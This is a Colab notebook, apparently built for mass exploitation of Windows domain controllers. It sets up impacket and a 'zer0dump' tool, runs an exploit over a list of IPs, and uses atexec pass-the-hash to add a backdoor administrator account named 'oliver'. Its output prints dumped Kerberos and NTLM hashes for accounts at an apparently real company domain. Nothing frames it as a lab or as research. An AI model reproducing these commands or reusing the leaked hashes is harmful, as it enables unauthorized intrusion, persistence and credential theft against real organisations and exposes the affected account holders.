# %% [markdown]
# <a href="https://colab.research.google.com/github/duongledai/duongledai/blob/master/olivermass.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %%
#liên ket voi google
from google.colab import drive
drive.mount('/content/gdrive')
# Out:
# Mounted at /content/gdrive

# %%
# cai moi truong
# !sudo apt-get install nmap
# !apt install python
# !apt install
# !apt install git
# !git clone https://github.com/SecureAuthCorp/impacket.git
# !git clone https://github.com/olivervn/zero
# chuyen den thu muc impacket 
# %cd impacket/
# !pip install .
# Out:
# Reading package lists... Done
# Building dependency tree
# Reading state information... Done
# nmap is already the newest version (7.60-1ubuntu5).
# 0 upgraded, 0 newly installed, 0 to remove and 14 not upgraded.
# Reading package lists... Done
# Building dependency tree
# Reading state information... Done
# python is already the newest version (2.7.15~rc1-1).
# 0 upgraded, 0 newly installed, 0 to remove and 14 not upgraded.
# Reading package lists... Done
# Building dependency tree
# Reading state information... Done
# 0 upgraded, 0 newly installed, 0 to remove and 14 not upgraded.
# Reading package lists... Done
# Building dependency tree
# Reading state information... Done
# git is already the newest version (1:2.17.1-1ubuntu0.7).
# 0 upgraded, 0 newly installed, 0 to remove and 14 not upgraded.
# Cloning into 'impacket'...
# remote: Enumerating objects: 74, done.
# remote: Counting objects: 100% (74/74), done.
# remote: Compressing objects: 100% (61/61), done.
# ...

# %%
# tao file good
# %cd /content/gdrive/MyDrive/zero/zer0dumpEX/
# !python mass.py ip.txt
# Out:
# [Errno 2] No such file or directory: '/content/gdrive/MyDrive/zero/zer0dumpEX/'
# /content/impacket
# python3: can't open file 'mass.py': [Errno 2] No such file or directory

# %%
# chuan bi khai thac
# %cd /content/gdrive/MyDrive/zero/zer0dumpEX/
# !chmod +x q
# !./q good.txt

# %%
# add user khong bo dau "" o net localgroup
# !python atexec.py -hashes :"hashes" "Ad/user@ip" "net user oliver 119065011 /add && net localgroup Administrators oliver /add"

# %%
# neu su dung netuser
# !python netuser good.txt

# %%
# !pip install colorama
# !python netuser_ovi.py good.txt
# Out:
# Streaming output truncated to the last 5000 lines.
# naturachak.com.mx\Tienda Nativitas:aes128-cts-hmac-sha1-96:5aa01fe29b9fbde3761cea34639792d9
# naturachak.com.mx\Tienda Nativitas:des-cbc-md5:735bd929b66e3452
# naturachak.com.mx\Tienda Nativitas:rc4_hmac:4c29e931cf1d9f8437c8c6ebd8c61d68
# naturachak.com.mx\Conta Local:aes256-cts-hmac-sha1-96:be815fb2fd3c3f47cbc67715517d3aafb05e3081639a09bb8b2881e624807334
# naturachak.com.mx\Conta Local:aes128-cts-hmac-sha1-96:e5fffa7a1e0a1993afd9270c760cb10d
# naturachak.com.mx\Conta Local:des-cbc-md5:32fe51fb1fea7cc2
# naturachak.com.mx\Conta Local:rc4_hmac:aaeb298ea4a28a9469720c933e3d6ca1
# naturachak.com.mx\Administracion:aes256-cts-hmac-sha1-96:b5f0e05dd341ba4d1a266aec37df52b080b6e4cb5dcba0ca0a9971620c575b78
# naturachak.com.mx\Administracion:aes128-cts-hmac-sha1-96:18dab21b62da55a08c7584ac0c400cd4
# naturachak.com.mx\Administracion:des-cbc-md5:e029f226d6049216
# naturachak.com.mx\Administracion:rc4_hmac:805069bc87e7315582b9c5cbc1da0dbf
# ...
